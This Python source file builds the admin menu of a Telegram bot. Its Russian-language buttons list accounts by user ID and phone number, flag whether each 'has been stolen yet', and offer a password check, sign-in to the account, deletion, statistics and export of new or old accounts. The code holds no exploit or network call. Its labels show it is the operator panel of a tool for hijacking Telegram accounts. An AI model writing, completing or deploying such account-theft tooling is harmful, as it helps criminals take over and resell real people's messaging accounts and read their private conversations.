from tgbot.states.State import State
from tgbot.services.MenuAPI import Menu


class admin:

	async def main(self):
		menu = Menu()
		await menu.add_inline_button([
			{
				'name': '👤 Аккаунты',
				'state': State.admin.accs
			},
			{
				'name': '🔍 Чекнуть',
				'state': State.admin.check
			},
		])

		await menu.add_inline_button([
			{
				'name': '📈 Статистика',
				'state': State.admin.statistic
			},
			{
				'name': '📤 Экспорт',
				'state': State.admin.export
			}
		])
		return await menu.get_markup()

	async def accs(self, accs, state):
		segment = 6
		page = (await state.get_data())['page']
		print(accs)
		menu = Menu()
		for i in range(segment*page-segment, page*segment):
			try:
				user = accs[i]['user_id']
				status = "✅" if accs[i]['reset_auth'] else "❗️"
				await menu.add_inline_button([{
					'name': f"{status} {user}",
					'state': State.admin.open_acc,
					'callback': f'open_acc_{user}_{accs[i]["reset_auth"]}',
					'if': accs[i]["reset_auth"],
					'answer': 'Аккаунт еще не украден, использование не возможно.',
					'_select': accs[i]['phone']
				}])
			except Exception as e:
				break

		await menu.insert_list(
			state=State.admin.accs,
			list=len(accs),
			segment=segment,
			select_page=page
		)
		await menu.insert(state=State.admin.main)
		return await menu.get_markup()

	async def select(self, phone):
		menu = Menu()
		await menu.add_inline_button([
			{
				'name': 'Чек паролей',
				'callback': f'acc_check_pass_{phone}',
				'state': State.admin.acc_check_pass
			},
			{
				'name': 'Войти',
				'callback': f'acc_sign_in_{phone}',
				'state': State.admin.acc_sign_in
			},
		])
		await menu.insert(state=State.admin.accs)
		return await menu.get_markup()

	async def delete_acc(self, phone):
		menu = Menu()
		await menu.add_inline_button([
			{
				'name': '✅ Да',
				'callback': f'delete_acc_{phone}',
				'state': State.admin.delete_acc
			},
			{
				'name': '❌ Нет',
				'state': State.admin.accs
			}
		])
		return await menu.get_markup()

	async def export(self):
		menu = Menu()
		await menu.add_inline_button([
			{
				'name': 'Новые',
				'state': State.admin.export_new
			},
			{
				'name': 'Старые',
				'state': State.admin.export_old
			},
			{
				'name': 'Все',
				'state': State.admin.export_all
			}
		])
		await menu.insert(state=State.admin.main)
		return await menu.get_markup()

	async def back_to_open_acc(self):
		menu = Menu()
		await menu.insert(state=State.admin.open_acc)
		return await menu.get_markup()

	async def back_to_menu(self):
		menu = Menu()
		await menu.insert(state=State.admin.main)
		return await menu.get_markup()
